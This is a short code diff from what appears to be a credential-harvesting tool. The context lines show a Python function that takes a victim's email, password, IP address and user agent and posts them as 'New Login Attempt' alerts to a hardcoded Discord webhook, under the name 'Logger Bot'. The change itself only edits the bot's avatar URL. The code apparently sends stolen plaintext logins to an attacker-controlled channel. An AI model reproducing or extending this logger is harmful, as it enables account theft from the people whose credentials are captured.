@@ -21,7 +21,7 @@ DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1339995668625756232/jUZh
 def send_discord_message(email, password, ip, useragent):
     message = {
         "username": "Logger Bot",
-        "avatar_url": "https://ibb.co/s95JCHnm",  # Optional bot avatar
+        "avatar_url": "https://ibb.co/s95JCHnm.png",  # Optional bot avatar
         "embeds": [
             {
                 "title": "🔔 New Login Attempt",
